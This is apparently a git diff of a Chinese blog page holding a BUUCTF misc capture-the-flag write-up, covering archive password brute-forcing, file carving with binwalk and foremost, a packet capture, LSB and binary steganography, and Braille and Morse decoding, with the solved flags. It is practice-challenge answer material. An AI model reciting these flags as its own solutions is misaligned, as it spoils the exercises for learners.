+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210618155035.png"></p>
+<h1 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093254.png"></p>
+<h2 id="知识点-17"><a href="#知识点-17" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>.rar加密文件使用archpr破解</li>
+</ul>
+<h2 id="过程-17"><a href="#过程-17" class="headerlink" title="过程"></a>过程</h2><p>binwalk发现rar文件，然后使用foremost分离文件，打开archpr爆破四位纯数字密码</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210618160448.png"></p>
+<h1 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093300.png"></p>
+<h2 id="知识点-18"><a href="#知识点-18" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>关注图片属性中的信息</li>
+</ul>
+<h2 id="过程-18"><a href="#过程-18" class="headerlink" title="过程"></a>过程</h2><p>打开附件，是一张图片，binwalk分析，发现.zip文件，foremost分离，发现存在密码，没给提示，先试试4纯数字，直接打开工具ziperello，1-8位纯数字都没爆破出，然后发现属性给了提示</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210618161201.png"></p>
+<p>把这个当做密码得到flag</p>
+<h1 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093308.png"></p>
+<h2 id="知识点-19"><a href="#知识点-19" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>关注每个数据包中隐藏的细节</li>
+</ul>
+<h2 id="过程-19"><a href="#过程-19" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210618161813.png"></p>
+<p>打开流量包，发现目的地址为192.155.81.86的流量末尾依次出现flag385b87afc8671dee07550290d16a8071，添加{}即可得到flag</p>
+<h1 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093315.png"></p>
+<h2 id="知识点-20"><a href="#知识点-20" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>关注二进制方式打开文件中隐藏的信息</li>
+</ul>
+<h2 id="过程-20"><a href="#过程-20" class="headerlink" title="过程"></a>过程</h2><p>打开图片，属性和binwalk没得到啥信息，二进制方式打开文件，发现一串二进制值</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210619185106.png"></p>
+<p>八位为一个ascii，转换即可得到flag</p>
+<pre class="line-numbers language-none"><code class="language-none">01101011 k
+01101111 o
+01100101 e
+01101011 k
+01101010 j
+00110011 3
+01110011 s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>flag{koekj3s}</p>
+<h1 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093321.png"></p>
+<h2 id="知识点-21"><a href="#知识点-21" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>关注二进制打开方式中隐藏的信息</li>
+</ul>
+<h2 id="过程-21"><a href="#过程-21" class="headerlink" title="过程"></a>过程</h2><p>打开图片，用binwalk分析，发现里面还有一张图片，但是无法利用，就第一张照片用winhex打开搜索即可得到flag</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210619190500.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210619190635.png"></p>
+<p>LSB隐写，我们发现是个zip文件，然后保存为xx.zip</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210619192330.png"></p>
+<p>解压之后发现一个ELF文件</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210619192426.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210619192532.png"></p>
+<p>赋予权限，直接执行即可</p>
+<h1 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620100312.png"></p>
+<h2 id="知识点-22"><a href="#知识点-22" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>关注图片本身隐藏的信息</li>
+</ul>
+<h2 id="过程-22"><a href="#过程-22" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620100337.png"></p>
+<p>打开附件，发现两个文件，一个加密的.zip文件，是上方的一张图片。容易发现张图片下方的部分，是盲文，根据盲文解出的密文，很有可能是对应压缩文件的密码</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620100550.png"></p>
+<p>查表可得，密文：kmdonowg，解压文件成功，得到一个 .wav音频文件，然后听出是莫斯密码，使用audacity打开</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620100933.png"></p>
+<p>flag{wpei08732?23dz}</p>
 
                 
             </div>
@@ -707,7 +692,7 @@ msf5 exploit(multi/handler) &gt; run
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://southerose.gitee.io/2021/04/11/metasploit/">http://southerose.gitee.io/2021/04/11/metasploit/</a>
+                    <a href="http://southerose.gitee.io/2021/06/20/buuctf-misc-wp/">http://southerose.gitee.io/2021/06/20/buuctf-misc-wp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -744,7 +729,19 @@ msf5 exploit(multi/handler) &gt; run
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/buuctf/">
+                                    <span class="chip bg-color">buuctf</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
+                                </a>
+                            
+                                <a href="/tags/misc/">
+                                    <span class="chip bg-color">misc</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -912,16 +909,17 @@ msf5 exploit(multi/handler) &gt; run
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/04/11/git/">
+                <a href="/2021/06/20/buuctf-misc-wp/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411182120.png" class="responsive-img" alt="git+bash教程">
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620102558.png" class="responsive-img" alt="buuctf-misc-wp">
                         
-                        <span class="card-title">git+bash教程</span>
+                        <span class="card-title">buuctf-misc-wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -931,20 +929,37 @@ msf5 exploit(multi/handler) &gt; run
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
-                                    工具
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
                                 </a>
                             
                             
                         </span>
                     </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/buuctf/">
+                        <span class="chip bg-color">buuctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -956,12 +971,12 @@ msf5 exploit(multi/handler) &gt; run
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/04/11/netcat/">
+                <a href="/2021/04/16/dc/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411180721.png" class="responsive-img" alt="netcat教程">
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210417103737.png" class="responsive-img" alt="DC靶机系列">
                         
-                        <span class="card-title">netcat教程</span>
+                        <span class="card-title">DC靶机系列</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -972,14 +987,14 @@ msf5 exploit(multi/handler) &gt; run
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
-                                    工具
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
                                 </a>
                             
                             
